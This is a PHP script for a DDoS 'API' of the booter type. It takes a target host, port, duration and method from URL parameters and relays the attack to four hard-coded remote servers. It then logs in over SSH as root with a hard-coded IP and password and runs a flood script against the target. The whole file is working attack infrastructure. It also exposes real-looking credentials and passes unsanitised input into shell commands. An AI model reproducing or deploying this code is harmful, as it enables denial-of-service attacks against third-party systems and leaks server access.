<?php
/////////////////////////////////
//--     DDoS Api Script layer4 / Layer7                --//
/////////////////////////////////
ignore_user_abort(true);
set_time_limit(81);

error_reporting(E_ALL);
ini_set('display_errors', 1);

//////////////////////////////////////////
//--    You're servers credentials    --//
//-- Enter you're servers credentials --//
//////////////////////////////////////////
$server_ip = "149.202.144.177"; //Change "1337" to your servers IP.
$server_pass = "tokale192123"; //Change "pass" to your servers password.
$server_user = "root"; //Only change this if your using a user other than root.
 
/////////////////////////////////////////
//-- Gets the value of each variable --//
/////////////////////////////////////////
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];

            $curl_handle=curl_init();
  curl_setopt($curl_handle,CURLOPT_URL,"http://185.246.154.85/L7-1.php?host=$host&port=$port&time=$time&method=$method");
  curl_setopt($curl_handle,CURLOPT_TIMEOUT,2);
  curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER,1);
  $buffer = curl_exec($curl_handle);
  curl_close($curl_handle);
  
            $curl_handle=curl_init();
  curl_setopt($curl_handle,CURLOPT_URL,"http://185.246.152.168/L7-2.php?host=$host&port=$port&time=$time&method=$method");
  curl_setopt($curl_handle,CURLOPT_TIMEOUT,2);
  curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER,1);
  $buffer = curl_exec($curl_handle);
  curl_close($curl_handle);
  
            $curl_handle=curl_init();
  curl_setopt($curl_handle,CURLOPT_URL,"http://185.246.152.169/L7-3.php?host=$host&port=$port&time=$time&method=$method");
  curl_setopt($curl_handle,CURLOPT_TIMEOUT,2);
  curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER,1);
  $buffer = curl_exec($curl_handle);
  curl_close($curl_handle);
  
              $curl_handle=curl_init();
  curl_setopt($curl_handle,CURLOPT_URL,"http://145.239.212.16/L7-4.php?host=$host&port=$port&time=$time&method=$method");
  curl_setopt($curl_handle,CURLOPT_TIMEOUT,2);
  curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER,1);
  $buffer = curl_exec($curl_handle);
  curl_close($curl_handle);
  
///////////////////////////////////////////////////
//-- array of implemented method as a variable --//
///////////////////////////////////////////////////
$array = array("L7", "STOP");// Add you're existing methods here, and delete you're none existent methods.
/////////////////////////////////
//-- Checks if time is empty --//
/////////////////////////////////
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
/////////////////////////////////
//-- Checks if host is empty --//
/////////////////////////////////
if (!empty($host)){
}else{
die('Error: Host is empty!');}
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
///////////////////////////////////
//-- Checks if method is empty --//
///////////////////////////////////
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
///////////////////////////////////////////////////
//-- Uses regex to see if the Port could exist --//
///////////////////////////////////////////////////
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
 
//////////////////////////////////
//-- Sets a Maximum boot time --//
//////////////////////////////////             

 
if(ctype_digit($time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($port)){
die('Error: Port is not in numeric form!');}
 
//////////////////////////////////////////////////////////////////////////////
//--                        You're attack methods                         --//
//-- Make sure the command is formatted correctly for each method you add --//
//////////////////////////////////////////////////////////////////////////////

if ($method == "L7") { $command = "bash timerl.sh $host $time"; }

if ($method == "STOP") { $command = "pkill $host -f"; }
///////////////////////////////////////////////////////
//-- Check to see if the server has SSH2 installed --//
///////////////////////////////////////////////////////
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
///////////////////////////////////////////////////
//-- Attempts to login with you're credentials --//
///////////////////////////////////////////////////
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
       
////////////////////////////////////////////////////////////////////////////
//-- Tries to execute the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////////////   
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
        
  
  
  
////////////////////////////////////////////////////////////////////
//-- Executed the attack with the requested method and settings --//
////////////////////////////////////////////////////////////////////      
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "</br>Host: $host</br>On Port: $port </br>Attack Length: $time Seconds</br>With: $method";
            fclose($stream);
        }
    }
}
?>
